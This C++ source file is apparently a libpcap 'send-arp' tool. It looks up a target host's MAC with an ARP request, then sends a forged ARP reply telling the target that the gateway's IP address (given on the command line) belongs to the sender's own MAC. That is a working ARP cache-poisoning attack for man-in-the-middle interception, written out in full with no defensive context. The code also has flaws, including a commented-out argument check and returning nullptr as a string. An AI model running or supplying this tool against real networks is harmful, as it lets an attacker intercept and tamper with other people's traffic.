#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <string>
#include <fstream>
#include <memory>

#include <stdio.h>
#include <stdlib.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

constexpr size_t MAC_ADDR_STR_LEN = 18;	// include NULL.


void usage() {
	printf("syntax: send-arp <interface>\n");
	printf("sample: send-arp wlan0\n");
}

std::string GetMyMac(const std::string dev_){
	std::string filePath = "/sys/class/net/" + dev_ + "/address";
	std::ifstream ifr;
	ifr.open(filePath, std::ifstream::in);
	if (!ifr.is_open()){
		fprintf(stderr, "can't open file %s\n", filePath.c_str());
		return nullptr;
	}

	static std::string res;
	std::getline(ifr, res);
	ifr.close();
	
	return res.c_str();
}

char* GetTargetMac(const char* dev_, const std::string targetIP_){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev_, errbuf);
		return nullptr;
	}

	EthArpPacket packetArpReq;

	packetArpReq.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packetArpReq.eth_.smac_ = Mac(GetMyMac(dev_));
	packetArpReq.eth_.type_ = htons(EthHdr::Arp);

	packetArpReq.arp_.hrd_ = htons(ArpHdr::ETHER);
	packetArpReq.arp_.pro_ = htons(EthHdr::Ip4);
	packetArpReq.arp_.hln_ = Mac::SIZE;
	packetArpReq.arp_.pln_ = Ip::SIZE;
	packetArpReq.arp_.op_ = htons(ArpHdr::Request);
	packetArpReq.arp_.smac_ = Mac(GetMyMac(dev_));
	packetArpReq.arp_.sip_ = htonl(Ip("0.0.0.0"));
	packetArpReq.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packetArpReq.arp_.tip_ = htonl(Ip(targetIP_));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetArpReq), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return nullptr;
	}


	struct pcap_pkthdr* header;
	const u_char* packetArpRepRaw;
	res = pcap_next_ex(handle, &header, &packetArpRepRaw);
	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
		return nullptr;
	}
	EthArpPacket* packetArpRep = (EthArpPacket*)malloc(header->caplen);
	memcpy(packetArpRep, packetArpRepRaw, header->caplen);
	//const uint32_t arp_rep_sip = ntohl(packetArpRep->arp_.sip_);
	//const uint32_t arp_rep_tip = ntohl(packetArpRep->arp_.tip_);
	//printf("sip_=%s\n", std::string(Ip(arp_rep_sip)).c_str());
	//printf("smac_=%s\n", std::string(packetArpRep->arp_.smac_).c_str());
	//printf("tip_=%s\n", std::string(Ip(arp_rep_tip)).c_str());
	//printf("tmac_=%s\n", std::string(packetArpRep->arp_.tmac_).c_str());
	

	pcap_close(handle);
	char* res_smac = (char*)malloc(sizeof(char) * MAC_ADDR_STR_LEN);
	strncpy(res_smac, std::string(packetArpRep->arp_.smac_).c_str(), sizeof(char) * MAC_ADDR_STR_LEN);
	return res_smac;
}

int main(int argc, char* argv[]) {
	/*
	if (argc != 3) {
		usage();
		return -1;
	}*/

	const std::string myMacAddress = GetMyMac(argv[1]);
	std::cout << myMacAddress << std::endl;

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	
	EthArpPacket packet;
	char* targetMac = GetTargetMac(dev, argv[2]);

	packet.eth_.dmac_ = Mac(targetMac);	// @Target MAC
	packet.eth_.smac_ = Mac(myMacAddress);					// My MAC
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(myMacAddress);					// My MAC
	packet.arp_.sip_ = htonl(Ip(argv[3]));					// GW IP
	packet.arp_.tmac_ = Mac(targetMac);							// @Target MAC
	packet.arp_.tip_ = htonl(Ip(argv[2]));					// Target IP

	printf("@@@\n");
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
	
}
